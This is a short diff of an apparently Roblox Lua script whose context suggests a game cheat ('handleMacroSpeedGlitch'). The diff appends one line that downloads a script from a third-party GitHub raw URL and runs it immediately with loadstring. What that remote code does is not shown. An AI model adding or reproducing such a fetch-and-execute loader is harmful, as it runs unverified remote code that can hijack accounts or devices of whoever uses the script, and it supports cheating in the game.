@@ -546,3 +546,4 @@ local function handleMacroSpeedGlitch()
 end
 
 handleMacroSpeedGlitch()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vzexg-2/ScriptFolder/refs/heads/main/button.nga"))()
